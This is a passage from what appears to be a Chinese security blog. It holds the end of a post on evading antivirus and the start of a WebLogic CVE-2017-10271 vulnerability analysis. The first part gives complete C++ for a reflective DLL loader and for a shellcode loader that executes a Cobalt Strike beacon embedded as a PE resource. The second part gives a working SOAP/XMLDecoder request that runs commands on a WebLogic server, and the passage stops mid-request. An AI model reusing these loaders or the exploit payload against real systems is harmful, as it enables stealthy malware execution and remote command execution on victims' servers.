ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">	DWORD_PTR relocationTable &#x3D; relocations.VirtualAddress + (DWORD_PTR)dllBase;</span><br><span class="line">	DWORD relocationsProcessed &#x3D; 0;</span><br><span class="line"></span><br><span class="line">	while (relocationsProcessed &lt; relocations.Size)</span><br><span class="line">	&#123;</span><br><span class="line">		PBASE_RELOCATION_BLOCK relocationBlock &#x3D; (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);</span><br><span class="line">		relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_BLOCK);</span><br><span class="line">		DWORD relocationsCount &#x3D; (relocationBlock-&gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) &#x2F; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line">		PBASE_RELOCATION_ENTRY relocationEntries &#x3D; (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);</span><br><span class="line"></span><br><span class="line">		for (DWORD i &#x3D; 0; i &lt; relocationsCount; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line"></span><br><span class="line">			if (relocationEntries[i].Type &#x3D;&#x3D; 0)</span><br><span class="line">			&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD_PTR relocationRVA &#x3D; relocationBlock-&gt;PageAddress + relocationEntries[i].Offset;</span><br><span class="line">			DWORD_PTR addressToPatch &#x3D; 0;</span><br><span class="line">			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR), NULL);</span><br><span class="line">			addressToPatch +&#x3D; deltaImageBase;</span><br><span class="line">			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; resolve import address table</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR importDescriptor &#x3D; NULL;</span><br><span class="line">	IMAGE_DATA_DIRECTORY importsDirectory &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">	importDescriptor &#x3D; (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);</span><br><span class="line">	LPCSTR libraryName &#x3D; &quot;&quot;;</span><br><span class="line">	HMODULE library &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">	while (importDescriptor-&gt;Name !&#x3D; NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		libraryName &#x3D; (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)dllBase;</span><br><span class="line">		library &#x3D; LoadLibraryA(libraryName);</span><br><span class="line"></span><br><span class="line">		if (library)</span><br><span class="line">		&#123;</span><br><span class="line">			PIMAGE_THUNK_DATA thunk &#x3D; NULL;</span><br><span class="line">			thunk &#x3D; (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">			while (thunk-&gt;u1.AddressOfData !&#x3D; NULL)</span><br><span class="line">			&#123;</span><br><span class="line">				if (IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal))</span><br><span class="line">				&#123;</span><br><span class="line">					LPCSTR functionOrdinal &#x3D; (LPCSTR)IMAGE_ORDINAL(thunk-&gt;u1.Ordinal);</span><br><span class="line">					thunk-&gt;u1.Function &#x3D; (DWORD_PTR)GetProcAddress(library, functionOrdinal);</span><br><span class="line">				&#125;</span><br><span class="line">				else</span><br><span class="line">				&#123;</span><br><span class="line">					PIMAGE_IMPORT_BY_NAME functionName &#x3D; (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk-&gt;u1.AddressOfData);</span><br><span class="line">					DWORD_PTR functionAddress &#x3D; (DWORD_PTR)GetProcAddress(library, functionName-&gt;Name);</span><br><span class="line">					thunk-&gt;u1.Function &#x3D; functionAddress;</span><br><span class="line">				&#125;</span><br><span class="line">				++thunk;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		importDescriptor++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; execute the loaded DLL</span><br><span class="line">	DLLEntry DllEntry &#x3D; (DLLEntry)((DWORD_PTR)dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);</span><br><span class="line"></span><br><span class="line">	CloseHandle(dll);</span><br><span class="line">	HeapFree(GetProcessHeap(), 0, dllBytes);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    我们先看一下执行的结果把，如下所示：</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110173735378.png" alt="image-20201110173735378"></p>
<p>​    也就是通过上面的代码，可以加载并运行我们的dll，了解了这个我们再来看一下代码实现的逻辑。</p>
<p>​    首先，通过下面的代码声明两个结构体，并且声明了一个函数指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct BASE_RELOCATION_BLOCK &#123;</span><br><span class="line">	DWORD PageAddress;</span><br><span class="line">	DWORD BlockSize;</span><br><span class="line">&#125; BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_ENTRY &#123;</span><br><span class="line">	USHORT Offset : 12;</span><br><span class="line">	USHORT Type : 4;</span><br><span class="line">&#125; BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;</span><br><span class="line"></span><br><span class="line">using DLLEntry &#x3D; BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);</span><br></pre></td></tr></table></figure>

<p>​    下面使用 GetModuleHandleA(NULL)来返回进程的地址空间中的可执行文件的基地址，使用GetFileSize打开我们要加载的DLL文件，再调用在堆上分配大小为dllsize的内存空间，通过ReadFile将DLL文件中的内容写入到刚分配的堆地址空间中。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PVOID imageBase &#x3D; GetModuleHandleA(NULL);</span><br><span class="line">	HANDLE dll &#x3D; CreateFileA(&quot;C:\\Users\\admin\\source\\repos\\testDLl\\Debug\\testDLl.dll&quot;, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);</span><br><span class="line">	DWORD64 dllSize &#x3D; GetFileSize(dll, NULL);</span><br><span class="line">	LPVOID dllBytes &#x3D; HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);</span><br><span class="line">	DWORD outSize &#x3D; 0;</span><br><span class="line">	ReadFile(dll, dllBytes, dllSize, &amp;outSize, NULL);</span><br></pre></td></tr></table></figure>

<p>​    我们调试一下这个程序，可以看到当运行完ReadFile后，确实将DLL的内容复制到了dllBytes指向的内存中。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110175404600.png" alt="image-20201110175404600"></p>
<p>​    好了，我们再看一下后面的代码，首先获取dosheaders，再通过dllbytes首地址+dosheaders-&gt;e_lfanew的值相加，得到pe头的地址。再通过取出OptionalHeader.SizeOfImage属性获取映像加载到内存后的大小    。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111095440475.png" alt="image-20201111095440475"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_DOS_HEADER dosHeaders &#x3D; (PIMAGE_DOS_HEADER)dllBytes; </span><br><span class="line">PIMAGE_NT_HEADERS ntHeaders &#x3D; (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders-&gt;e_lfanew);</span><br><span class="line">SIZE_T dllImageSize &#x3D; ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br></pre></td></tr></table></figure>

<p>​        再使用VirtualAlloc分配一块基址为ntHeaders-&gt;OptionalHeader.ImageBase，大小为dllImageSize的内存，并且更改内存为可读写执行权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPVOID dllBase &#x3D; VirtualAlloc((LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br></pre></td></tr></table></figure>

<p>​    获取我们预期分配地址和实际分配地址的差值，并且将文件头部复制到分配的内存中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DWORD_PTR deltaImageBase &#x3D; (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">std::memcpy(dllBase, dllBytes, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111102159539.png" alt="image-20201111102159539">    </p>
<p>​    下面的代码将区块表的内容拷贝到分配的内存中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_SECTION_HEADER section &#x3D; IMAGE_FIRST_SECTION(ntHeaders);</span><br><span class="line">for (size_t i &#x3D; 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">	LPVOID sectionDestination &#x3D; (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section-&gt;VirtualAddress);</span><br><span class="line">	LPVOID sectionBytes &#x3D; (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section-&gt;PointerToRawData);</span><br><span class="line">	std::memcpy(sectionDestination, sectionBytes, section-&gt;SizeOfRawData);</span><br><span class="line">	section++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    下面的代码用来修改pe的重定位表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY relocations &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">	DWORD_PTR relocationTable &#x3D; relocations.VirtualAddress + (DWORD_PTR)dllBase;</span><br><span class="line">	DWORD relocationsProcessed &#x3D; 0;</span><br><span class="line"></span><br><span class="line">	while (relocationsProcessed &lt; relocations.Size)</span><br><span class="line">	&#123;</span><br><span class="line">		PBASE_RELOCATION_BLOCK relocationBlock &#x3D; (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);</span><br><span class="line">		relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_BLOCK);</span><br><span class="line">		DWORD relocationsCount &#x3D; (relocationBlock-&gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) &#x2F; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line">		PBASE_RELOCATION_ENTRY relocationEntries &#x3D; (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);</span><br><span class="line"></span><br><span class="line">		for (DWORD i &#x3D; 0; i &lt; relocationsCount; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line"></span><br><span class="line">			if (relocationEntries[i].Type &#x3D;&#x3D; 0)</span><br><span class="line">			&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD_PTR relocationRVA &#x3D; relocationBlock-&gt;PageAddress + relocationEntries[i].Offset;</span><br><span class="line">			DWORD_PTR addressToPatch &#x3D; 0;</span><br><span class="line">			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR), NULL);</span><br><span class="line">			addressToPatch +&#x3D; deltaImageBase;</span><br><span class="line">			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>​    被注入的DLL可能还依赖于其他的DLL，因此我们还需要装载这些被依赖的DLL，并修改本DLL的引入表，使这些被引入的函数能正常运行。解析导入表，根据IMAGE_IMPORT_DESCRIPTOR中的NAME成员找到DLL的名称，根据名称装载被依赖的DLL,IMAGE_IMPORT_DESCRIPTOR的FirstThunk指向了DLL引入了哪些函数。通过GetProcAddress可以找到函数的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_IMPORT_DESCRIPTOR importDescriptor &#x3D; NULL;</span><br><span class="line">IMAGE_DATA_DIRECTORY importsDirectory &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">importDescriptor &#x3D; (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);</span><br><span class="line">LPCSTR libraryName &#x3D; &quot;&quot;;</span><br><span class="line">HMODULE library &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">while (importDescriptor-&gt;Name !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">	libraryName &#x3D; (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)dllBase;</span><br><span class="line">	library &#x3D; LoadLibraryA(libraryName); </span><br><span class="line"></span><br><span class="line">	if (library)</span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_THUNK_DATA thunk &#x3D; NULL;</span><br><span class="line">		thunk &#x3D; (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">		while (thunk-&gt;u1.AddressOfData !&#x3D; NULL)</span><br><span class="line">		&#123;</span><br><span class="line">			if (IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal))</span><br><span class="line">			&#123;</span><br><span class="line">				LPCSTR functionOrdinal &#x3D; (LPCSTR)IMAGE_ORDINAL(thunk-&gt;u1.Ordinal);</span><br><span class="line">				thunk-&gt;u1.Function &#x3D; (DWORD_PTR)GetProcAddress(library, functionOrdinal);</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				PIMAGE_IMPORT_BY_NAME functionName &#x3D; (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk-&gt;u1.AddressOfData);</span><br><span class="line">				DWORD_PTR functionAddress &#x3D; (DWORD_PTR)GetProcAddress(library, functionName-&gt;Name);</span><br><span class="line">				thunk-&gt;u1.Function &#x3D; functionAddress;</span><br><span class="line">			&#125;</span><br><span class="line">			++thunk;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	importDescriptor++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    通过AddressOfEntryPoint找到DLL文件的入口点，最终会执行dllmain函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DLLEntry DllEntry &#x3D; (DLLEntry)((DWORD_PTR)dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);</span><br></pre></td></tr></table></figure>

<p>​    由于个人windows基础能力有限，关于上面代码的分析参考<a href="https://www.freebuf.com/articles/others-articles/245305.html" target="_blank" rel="noopener">恶意代码分析之反射型DLL注入</a>、<a href="https://github.com/potats0/PeLoader" target="_blank" rel="noopener">peloader</a>，最后我们再理一下这个过程</p>
<ul>
<li>在堆上分配一块内存，将DLL文件加载到内存</li>
<li>将DLL文件头部放到分配的内存上</li>
<li>将区块表的内容复制到内存</li>
<li>修改重定向表和解析导入表</li>
<li>调用DLL</li>
</ul>
<h2 id="从PE-resource加载shellcode"><a href="#从PE-resource加载shellcode" class="headerlink" title="从PE resource加载shellcode"></a>从PE resource加载shellcode</h2><p>​    使用这种方式可以将shellcode放到资源文件中进行加载，具体操作过程如下：</p>
<p>首先生成一个stagerless的bin文件，我这里使用cobaltstrike来进行生成，生成以后将bin添加到资源文件中</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111171204066.png" alt="image-20201111171204066"></p>
<p>​    选择导入资源，选择我们生成的bin文件，资源类型由我们自己命名</p>
<img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111175537339.png" alt="image-20201111175537339" style="zoom:67%;">



<p>​    在头文件中可以看到我们加载的资源文件的标识符。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111175617208.png" alt="image-20201111175617208"></p>
<p>​    最后使用如下代码加载资源并进行解析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &quot;resource.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode</span><br><span class="line">	&#x2F;&#x2F; METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin</span><br><span class="line">	HRSRC shellcodeResource &#x3D; FindResource(NULL, MAKEINTRESOURCE(IDR_BEACON1), L&quot;METERPRETER_BIN&quot;);</span><br><span class="line">	DWORD shellcodeSize &#x3D; SizeofResource(NULL, shellcodeResource);</span><br><span class="line">	HGLOBAL shellcodeResouceData &#x3D; LoadResource(NULL, shellcodeResource);</span><br><span class="line"></span><br><span class="line">	void* exec &#x3D; VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(exec, shellcodeResouceData, shellcodeSize);</span><br><span class="line">	((void(*)())exec)();</span><br><span class="line"></span><br><span class="line">	return  0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    上面的代码首先通过FindResource找到我们想要加载的资源，通过LoadResource加载资源的内容，再通过VirtualAlloc分配一块内存，将资源复制到内存，通过函数指针的方式调用执行shellcode。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111180732544.png" alt="image-20201111180732544"></p>
<p>​    也可以将DLL加载到资源中执行，这个操作需要依赖<a href="https://github.com/monoxgas/sRDI" target="_blank" rel="noopener">sRDI</a></p>
<p>​    首先生成一个dll文件，利用ConvertToShellcode.py将DLL文件转换为bin文件</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111182017884.png" alt="image-20201111182017884"></p>
<p>​    在vs中将生成的beacon.bin文件放到资源中加载，我测试执行并没有成功，但是生成一个messagebox弹窗的dll转换为bin执行是可以的，原因未知。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111193353829.png" alt="image-20201111193353829"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">weblogic漏洞分析系列之CVE-2017-10271漏洞分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-10-30 23:15:58" itemprop="dateCreated datePublished" datetime="2020-10-30T23:15:58+08:00">2020-10-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-04-03 15:05:10" itemprop="dateModified" datetime="2021-04-03T15:05:10+08:00">2021-04-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞分析</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    CVE-2017-10271漏洞是由于通过readobject解析webservice接口中的xml代码导致命令执行的，今天我们一起学习一下这个漏洞是如何导致的并分析一下漏洞的检测方法。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>​        这里直接给出文件写入的poc，数据包如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;192.168.3.1:7001&#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.1:7001</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 613</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;cmd&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo 111 &gt; c:\windows\temp\test666.txt&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span 